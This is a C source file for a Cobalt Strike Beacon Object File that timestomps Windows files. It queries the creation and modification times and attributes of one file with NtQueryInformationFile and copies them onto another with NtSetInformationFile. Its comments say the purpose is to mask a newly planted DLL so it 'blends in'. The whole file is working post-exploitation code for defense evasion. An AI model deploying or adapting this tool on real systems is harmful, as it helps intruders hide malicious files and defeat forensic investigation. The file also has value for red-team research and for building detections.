// Original Author: Austin Hudson (Mumbai)
// Original link: https://gist.github.com/realoriginal/cb996601ced986e48afb0c768ef43e66
// BOF Author: r00t0v3rr1d3
// x86_64-w64-mingw32-gcc touch.c -o touch.exe -lntdll
// x86_64-w64-mingw32-gcc -c touch.c -o touch.x64.o -lntdll
// i686-w64-mingw32-gcc -c touch.c -o touch.x86.o -lntdll
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include "beacon.h"

WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtSetInformationFile(HANDLE hFile,PIO_STATUS_BLOCK io,PVOID ptr,ULONG len,FILE_INFORMATION_CLASS FileInformationClass);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtQueryInformationFile(HANDLE hFile,PIO_STATUS_BLOCK io,PVOID ptr,ULONG len,FILE_INFORMATION_CLASS FileInformationClass);

// modifying creation times of files.
extern NTSTATUS NtQueryInformationFile(
        HANDLE,
        PIO_STATUS_BLOCK,
        PVOID,
        ULONG,
        FILE_INFORMATION_CLASS
);

extern NTSTATUS NtSetInformationFile(
        HANDLE,
        PIO_STATUS_BLOCK,
        PVOID,
        ULONG,
        FILE_INFORMATION_CLASS
);

void go(char * buff, int len)
{
        void * pts_org = NULL;
        void * pts_new = NULL;

	char * ts_org;
	char * ts_new;

	datap parser;

	BeaconDataParse(&parser, buff, len);
	ts_org = BeaconDataExtract(&parser, NULL);
	ts_new = BeaconDataExtract(&parser, NULL);

        pts_org = KERNEL32$CreateFileA(ts_org, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, NULL);
        pts_new = KERNEL32$CreateFileA(ts_new, GENERIC_ALL, 0, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, NULL);

        if ( pts_org != INVALID_HANDLE_VALUE && pts_new != INVALID_HANDLE_VALUE ) {
                IO_STATUS_BLOCK IoBlock;
                FILE_BASIC_INFORMATION IoInfo;
                // Queries the target executable's file attributes. Will be useful when
                // masking our new dll.
                if ( NTDLL$NtQueryInformationFile(pts_org, &IoBlock, &IoInfo, sizeof(IoInfo),
                        FileBasicInformation) != STATUS_SUCCESS ) {
                        BeaconPrintf(CALLBACK_ERROR, "NtQueryInformationFile() failure!");
                        goto end;
                }
                // Applies the attributes acquired from NtQueryInformationFile() to the ts_new
                // file to "blend" in.
                if ( NTDLL$NtSetInformationFile(pts_new, &IoBlock, &IoInfo, sizeof(IoInfo),
                        FileBasicInformation) != STATUS_SUCCESS ) {
                        BeaconPrintf(CALLBACK_ERROR, "NtSetInformationFile() failure");
                        goto end;
                }
        }
end:
        if ( pts_org != INVALID_HANDLE_VALUE )
                KERNEL32$CloseHandle(pts_org);
        if ( pts_new != INVALID_HANDLE_VALUE )
                KERNEL32$CloseHandle(pts_new);

        if ( KERNEL32$GetLastError() != 0 ) {
                BeaconPrintf(CALLBACK_ERROR, "Failed: %d", KERNEL32$GetLastError());
        }
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "Success!");
	}
}
